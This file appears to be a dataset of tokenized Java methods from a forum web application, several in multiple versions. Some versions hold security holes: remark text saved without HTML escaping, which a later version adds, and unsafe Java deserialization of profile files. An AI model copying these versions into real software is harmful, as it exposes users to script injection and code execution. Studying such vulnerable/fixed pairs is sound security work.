public void processRow ( ResultSet resultSet ) throws SQLException { EditHistoryDto editHistoryDto = new EditHistoryDto ( ) ; editHistoryDto . setId ( resultSet . getInt ( " id " ) ) ; editHistoryDto . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editHistoryDto . setEditor ( resultSet . getInt ( " editor " ) ) ; editHistoryDto . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editHistoryDto . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editHistoryDto . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editHistoryDto . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editHistoryDto . setObjectType ( resultSet . getString ( " object_type " ) ) ; editHistoryDto . setOldimage ( resultSet . getInt ( " oldimage " ) ) ; if ( resultSet . wasNull ( ) ) { editHistoryDto . setOldimage ( null ) ; } editHistoryDto . setOldminor ( resultSet . getBoolean ( " oldminor " ) ) ; if ( resultSet . wasNull ( ) ) { editHistoryDto . setOldminor ( null ) ; } editInfoDTOs . add ( editHistoryDto ) ; } 
public RedirectView deleteImage ( @RequestParam ( required = true ) int id , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic topic = topicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( topic , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , tmpl . getCurrentUser ( ) ) ; imageService . deleteImage ( tmpl . getCurrentUser ( ) , image ) ; return new RedirectView ( topic . getLinkLastmod ( ) ) ; } 
public void deleteImage ( User editor , Image image ) { EditHistoryDto info = new EditHistoryDto ( ) ; info . setEditor ( editor . getId ( ) ) ; info . setMsgid ( image . getTopicId ( ) ) ; info . setOldimage ( image . getId ( ) ) ; info . setObjectType ( EditHistoryObjectTypeEnum . TOPIC ) ; imageDao . deleteImage ( image ) ; editHistoryService . insert ( info ) ; } 
public Remark mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Remark ( resultSet ) ; } 
public void updateRemark ( int id , String text ) { jdbcTemplate . update ( " UPDATE user_remarks SET remark_text=? WHERE id=? " , text , id ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemarkClass ( tmpl . getCurrentUser ( ) , user ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | tmpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } return mv ; } 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " rid " ) String rid , @RequestParam ( " text " ) String text , @PathVariable String nick ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } if ( text . length ( ) > 255 ) { text = text . substring ( 0 , 255 ) ; } User user = tmpl . getCurrentUser ( ) ; User refUser = userDao . getUser ( nick ) ; Remark rm = userDao . getRemark ( user , refUser ) ; if ( rm ! = null ) { userDao . updateRemark ( rm . getId ( ) , text ) ; } else { userDao . setRemark ( user , refUser , text ) ; } return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemark ( tmpl . getCurrentUser ( ) , user ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | tmpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } return mv ; } 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " text " ) String text , @PathVariable String nick ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } if ( text . length ( ) > 255 ) { text = text . substring ( 0 , 255 ) ; } User user = tmpl . getCurrentUser ( ) ; User refUser = userDao . getUser ( nick ) ; Remark rm = userDao . getRemark ( user , refUser ) ; if ( rm ! = null ) { userDao . updateRemark ( rm . getId ( ) , text ) ; } else { userDao . setRemark ( user , refUser , text ) ; } return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " text " ) String text , @PathVariable String nick ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } text = StringUtil . escapeHtml ( text ) ; if ( text . length ( ) > 255 ) { text = text . substring ( 0 , 255 ) ; } User user = tmpl . getCurrentUser ( ) ; User refUser = userDao . getUser ( nick ) ; Remark rm = userDao . getRemark ( user , refUser ) ; if ( rm ! = null ) { userDao . updateRemark ( rm . getId ( ) , text ) ; } else { userDao . setRemark ( user , refUser , text ) ; } return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public static boolean isSessionAuthorized ( ) { Authentication authentication = SecurityContextHolder . getContext ( ) . getAuthentication ( ) ; return authentication ! = null & & ( authentication . isAuthenticated ( ) & & ! hasAuthority ( " ROLE_ANONYMOUS " ) ) ; } 
public static boolean isModeratorSession ( ) { return isSessionAuthorized ( ) & & hasAuthority ( " ROLE_MODERATOR " ) ; } 
public static boolean isCorrectorSession ( ) { return isSessionAuthorized ( ) & & hasAuthority ( " ROLE_CORRECTOR " ) ; } 
public static boolean isUsingDefaultProfile ( ) { return getCurrentProfile ( ) . isDefault ( ) ; } 
public LoginStatus loginAjax ( @RequestParam ( " nick " ) final String username , @RequestParam ( " passwd " ) final String password , HttpServletRequest request , HttpServletResponse response ) { UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken ( username , password ) ; try { UserDetailsImpl details = ( UserDetailsImpl ) userDetailsService . loadUserByUsername ( username ) ; 
public boolean isLoggedIn ( ) { return success ; } 
public String encodePassword ( String rawPass , Object salt ) { return encryptor . encryptPassword ( rawPass ) ; } 
public boolean isPasswordValid ( String encPass , String rawPass , Object salt ) { return encryptor . checkPassword ( rawPass , encPass ) ; } 
public void doFilter ( ServletRequest req , ServletResponse res , FilterChain chain ) throws IOException , ServletException { WebApplicationContext ctx = WebApplicationContextUtils . getWebApplicationContext ( getServletContext ( ) ) ; HttpServletRequest request = ( HttpServletRequest ) req ; request . getSession ( ) . setAttribute ( " configuration " , ctx . getBean ( Configuration . class ) ) ; request . getSession ( ) . setAttribute ( " template " , new Template ( ctx ) ) ; if ( AuthUtil . isSessionAuthorized ( ) ) { request . getSession ( ) . setAttribute ( " currentStyle " , AuthUtil . getCurrentUser ( ) . getStyle ( ) ) ; request . getSession ( ) . setAttribute ( " currentProfile " , AuthUtil . getCurrentProfile ( ) ) ; request . getSession ( ) . setAttribute ( " currentProperties " , AuthUtil . getProf ( ) ) ; forWikiManipulation ( request , ( HttpServletResponse ) res , AuthUtil . getAuthentication ( ) ) ; } else { request . getSession ( ) . setAttribute ( " currentStyle " , " tango " ) ; request . getSession ( ) . setAttribute ( " currentProfile " , Profile . getDefaultProfile ( ) ) ; request . getSession ( ) . setAttribute ( " currentProperties " , AuthUtil . getProf ( ) ) ; } CSRFManipulation ( request , ( HttpServletResponse ) res ) ; chain . doFilter ( req , res ) ; } 
private void CSRFManipulation ( HttpServletRequest request , HttpServletResponse response ) { Properties cookies = LorHttpUtils . getCookies ( request . getCookies ( ) ) ; if ( cookies . get ( CSRFProtectionService . CSRF_COOKIE ) = = null ) { CSRFProtectionService . generateCSRFCookie ( request , response ) ; } else { request . setAttribute ( CSRFProtectionService . CSRF_ATTRIBUTE , cookies . getProperty ( CSRFProtectionService . CSRF_COOKIE ) . trim ( ) ) ; } response . addHeader ( " Cache-Control " , " private " ) ; } 
private void forWikiManipulation ( HttpServletRequest request , HttpServletResponse response , Authentication authentication ) { HttpSession session = request . getSession ( ) ; AuthUtil . getCurrentUser ( ) . acegiSecurityHack ( response , session ) ; } 
public boolean isAccountNonExpired ( ) { return true ; } 
public boolean isAccountNonLocked ( ) { return ! user . isBlocked ( ) & & user . isActivated ( ) ; } 
public boolean isCredentialsNonExpired ( ) { return true ; } 
public boolean isEnabled ( ) { return ! user . isBlocked ( ) & & user . isActivated ( ) ; } 
public UserDetails loadUserByUsername ( String username ) throws UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , true ) ; if ( user = = null ) { throw new UsernameNotFoundException ( username ) ; } } else { try { user = userDao . getUser ( username ) ; } catch ( UserNotFoundException e ) { throw new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , readProfile ( user . getNick ( ) ) , configuration ) ; } 
private Profile readProfile ( String username ) { Storage storage = new FileStorage ( configuration . getPathPrefix ( ) + " linux-storage/ " ) ; InputStream df = null ; Map < String , Object > userProfile = null ; try { df = storage . getReadStream ( " profile " , username ) ; ObjectInputStream dof = null ; try { dof = new ObjectInputStream ( df ) ; userProfile = ( Map < String , Object > ) dof . readObject ( ) ; dof . close ( ) ; df . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + username ) ; } finally { if ( dof ! = null ) { try { dof . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + username ) ; } } } } catch ( StorageException e ) { logger . info ( " Bad profile for user " + username ) ; } catch ( ClassNotFoundException e ) { logger . info ( " Bad profile for user " + username ) ; } finally { if ( df ! = null ) { try { df . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + username ) ; } } } ProfileProperties properties ; if ( userProfile ! = null ) { properties = new ProfileProperties ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , userProfile ) ) ; } else { properties = new ProfileProperties ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < String , Object > ( ) ) ) ; } return new Profile ( properties , false ) ; } 
public boolean isSessionAuthorized ( ) { return AuthUtil . isSessionAuthorized ( ) ; } 
public boolean isModeratorSession ( ) { return AuthUtil . isModeratorSession ( ) ; } 
public boolean isCorrectorSession ( ) { return AuthUtil . isCorrectorSession ( ) ; } 
public void updateCurrentUser ( UserDao userDao ) { initCurrentUser ( true ) ; } 
private void initCurrentUser ( boolean forceUpdate ) { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } currentUser = AuthUtil . getCurrentUser ( ) ; } 
public void init ( ) { try { mainURI = new URI ( properties . getProperty ( " MainUrl " ) , true , " UTF-8 " ) ; } catch ( Exception e ) { throw new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } if ( ! mainURI . isAbsoluteURI ( ) ) { throw new RuntimeException ( ERR_MSG + " URI not absolute path " ) ; } try { String mainHost = mainURI . getHost ( ) ; if ( mainHost = = null ) { throw new RuntimeException ( ERR_MSG + " bad URI host " ) ; } } catch ( URIException e ) { throw new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } try { secureURI = new URI ( properties . getProperty ( " SecureUrl " , mainURI . toString ( ) . replaceFirst ( " http " , " https " ) ) , true , " UTF-8 " ) ; } catch ( Exception e ) { throw new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } MemCachedSettings . setMainUrl ( getMainUrl ( ) ) ; } 
public void checkBlockIP ( @Nonnull String addr , @Nonnull Errors errors , @Nullable User user ) throws UnknownHostException , TextParseException { checkBlockIP ( getBlockInfo ( addr ) , errors , user ) ; } 
private IPBlockInfo loadIPBlock ( HttpServletRequest request ) { return ipBlockDao . getBlockInfo ( request . getRemoteAddr ( ) ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) boolean allowPosting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) boolean captchaRequired ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user , reason , ts , allowPosting , captchaRequired ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , " UTF-8 " ) ) ) ; } 
public void blockIP ( String ip , User moderator , String reason , Timestamp ts , boolean allow_posting , boolean captcha_required ) { IPBlockInfo blockInfo = getBlockInfo ( ip ) ; if ( ! blockInfo . isInitialized ( ) ) { jdbcTemplate . update ( 
public List < PreparedRemark > prepareRemarkList ( List < Remark > list ) { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < PreparedRemark > remarksPrepared = new ArrayList < PreparedRemark > ( list . size ( ) ) ; for ( Remark remark : list ) { try { User refUser = userDao . getUserCached ( remark . getRefUserId ( ) ) ; remarksPrepared . add ( new PreparedRemark ( remark , refUser ) ) ; } catch ( UserNotFoundException e ) { } } return remarksPrepared ; } 
public static void updateLastLogin ( Authentication authentication , UserDao userDao ) { if ( authentication ! = null & & ( authentication . isAuthenticated ( ) ) ) { Object principal = authentication . getPrincipal ( ) ; 
public void onAuthenticationSuccess ( HttpServletRequest request , HttpServletResponse response , Authentication authentication ) throws IOException , ServletException { AuthUtil . updateLastLogin ( authentication , userDao ) ; super . onAuthenticationSuccess ( request , response , authentication ) ; } 
public void onAuthentication ( Authentication authentication , HttpServletRequest request , HttpServletResponse response ) { AuthUtil . updateLastLogin ( authentication , userDao ) ; super . onAuthentication ( authentication , request , response ) ; } 
public static boolean isSessionAuthorized ( ) { Authentication authentication = SecurityContextHolder . getContext ( ) . getAuthentication ( ) ; return authentication ! = null & & ( authentication . isAuthenticated ( ) & & ! hasAuthority ( " ROLE_SYSTEM_ANONYMOUS " ) ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , HttpServletRequest request , HttpServletResponse response ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemark ( tmpl . getCurrentUser ( ) , user ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | tmpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 120000 ) ; return mv ; } 
public List < PreparedRemark > prepareRemarkList ( List < Remark > list ) throws Exception { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < PreparedRemark > remarksPrepared = new ArrayList < PreparedRemark > ( list . size ( ) ) ; for ( Remark remark : list ) { User refUser = userDao . getUserCached ( remark . getRefUserId ( ) ) ; remarksPrepared . add ( new PreparedRemark ( remark , refUser ) ) ; } return remarksPrepared ; } 
public ModelAndView forumArchive ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @PathVariable int year , @PathVariable int month , HttpServletRequest request , HttpServletResponse response ) throws Exception { return forum ( groupName , offset , false , request , response , year , month ) ; } 
public ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request , HttpServletResponse response ) throws Exception { return forum ( groupName , offset , lastmod , request , response , null , null ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , HttpServletRequest request , HttpServletResponse response ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemark ( tmpl . getCurrentUser ( ) , user ) ) ; } if ( tmpl . isSessionAuthorized ( ) & & currentUser ) { mv . getModel ( ) . put ( " hasRemarks " , ( userDao . getRemarkCount ( tmpl . getCurrentUser ( ) ) > 0 ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | tmpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 120000 ) ; return mv ; } 
public void updateScore ( ) { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " groupid!=8404 and groupid!=4068 and groupid!=19390 and " + " not comments.deleted and not topics.deleted) " ) ; updateMaxScore ( ) ; } 
public void updateMaxScore ( ) { jdbcTemplate . update ( " update users set max_score=score where score>max_score " ) ; } 
public static void updateLastLogin ( Authentication authentication , UserDao userDao ) { try { if ( authentication ! = null & & ( authentication . isAuthenticated ( ) ) ) { 
private void forWikiManipulation ( HttpServletRequest request , HttpServletResponse response , Template template ) { HttpSession session = request . getSession ( ) ; User user = template . getCurrentUser ( ) ; if ( user ! = null ) { user . acegiSecurityHack ( response , session ) ; 
public boolean isAccountNonLocked ( ) { return nonLocked ; } 
public UserDetails loadUserByUsername ( String username ) throws UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , true ) ; if ( user = = null ) { throw new UsernameNotFoundException ( username ) ; } } else { try { user = userDao . getUser ( username ) ; } catch ( UserNotFoundException e ) { throw new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) ) ; } 
private void initCurrentUser ( boolean forceUpdate ) { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } try { currentUser = userDao . getUser ( AuthUtil . getNick ( ) ) ; 
private void forWikiManipulation ( HttpServletRequest request , HttpServletResponse response ) { HttpSession session = request . getSession ( ) ; AuthUtil . getCurrentUser ( ) . acegiSecurityHack ( response , session ) ; } 
public UserDetails loadUserByUsername ( String username ) throws UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , true ) ; if ( user = = null ) { throw new UsernameNotFoundException ( username ) ; } } else { try { user = userDao . getUser ( username ) ; userDao . updateLastlogin ( user ) ; } catch ( UserNotFoundException e ) { throw new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , readProfile ( user . getNick ( ) ) , configuration ) ; } 
private void forWikiManipulation ( HttpServletRequest request , HttpServletResponse response ) { HttpSession session = request . getSession ( ) ; User user = AuthUtil . getCurrentUser ( ) ; if ( user ! = null ) { user . acegiSecurityHack ( response , session ) ; 
public UserDetails loadUserByUsername ( String username ) throws UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , true ) ; if ( user = = null ) { throw new UsernameNotFoundException ( username ) ; } } else { try { user = userDao . getUser ( username ) ; UserInfo userInfo = userDao . getUserInfoClass ( user ) ; Calendar then = Calendar . getInstance ( ) ; then . setTime ( userInfo . getLastLogin ( ) ) ; Calendar now = Calendar . getInstance ( ) ; now . add ( Calendar . MINUTE , - 60 ) ; int diff = now . compareTo ( then ) ; if ( diff > 0 ) { userDao . updateLastlogin ( user ) ; } } catch ( UserNotFoundException e ) { throw new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , readProfile ( user . getNick ( ) ) , configuration ) ; } 
public UserDetails loadUserByUsername ( String username ) throws UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , true ) ; if ( user = = null ) { throw new UsernameNotFoundException ( username ) ; } } else { try { user = userDao . getUser ( username ) ; userDao . updateLastlogin ( user , false ) ; } catch ( UserNotFoundException e ) { throw new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , readProfile ( user . getNick ( ) ) , configuration ) ; } 
public void updateLastlogin ( User user , boolean force ) { if ( force ) { jdbcTemplate . update ( " UPDATE users SET lastlogin=CURRENT_TIMESTAMP WHERE id=? " , user . getId ( ) ) ; 
public ModelAndView reindexCurrentMonth ( ServletRequest request ) throws Exception { Calendar current = Calendar . getInstance ( ) ; for ( int i = 0 ; i < 3 ; i + + ) { searchQueueSender . updateMonth ( current . get ( Calendar . YEAR ) , current . get ( Calendar . MONTH ) + 1 ) ; current . add ( Calendar . MONTH , - 1 ) ; } return new ModelAndView ( " action-done " , " message " , " Scheduled reindex last 3 month " ) ; } 
public static boolean isSessionAuthorized ( ) { Authentication authentication = SecurityContextHolder . getContext ( ) . getAuthentication ( ) ; return authentication ! = null & & ( authentication . isAuthenticated ( ) & & ! hasAuthority ( " ROLE_SYSTEM_ANONYMOUS " ) & & hasAuthority ( " ROLE_ANONYMOUS " ) ) ; } 
public boolean isAccountNonLocked ( ) { return ! user . isBlocked ( ) ; } 
public boolean isEnabled ( ) { return ! user . isBlocked ( ) ; } 
public static ResultSet getHizel ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 34590 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " hizel " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " DffBkILVpGCDTC8ykceJzvcj5dJbhF38 " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( " " ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( " hz@vyborg.ru " ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 0 ) ; return resultSet ; } 
public void hizelTest ( ) throws Exception { ResultSet resultSet = Users . getHizel ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( " 0428dfed932b07ea582efd94038b1076 " , user . getActivationCode ( " secret " ) ) ; } 
public void commence ( HttpServletRequest request , HttpServletResponse response , AuthenticationException authException ) throws IOException , ServletException { return ; } 
public boolean checkIP ( String addr ) throws TextParseException { if ( addr . equals ( " 127.0.0.1 " ) ) { return false ; } String query = invertIPAddress ( addr ) + '.' + zone ; logger . debug ( " Looking for " + query ) ; Lookup lookup = new Lookup ( query , Type . A ) ; lookup . setResolver ( resolver ) ; Record [ ] r = lookup . run ( ) ; if ( r = = null | | r . length = = 0 ) { return false ; } logger . info ( " DNSBL: found " + addr + " in DNSBL: " + r [ 0 ] ) ; TODO: check what we really got ;-) return true; } 
public void initResource ( ) { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( LOCAL_SERVER ) ; } 
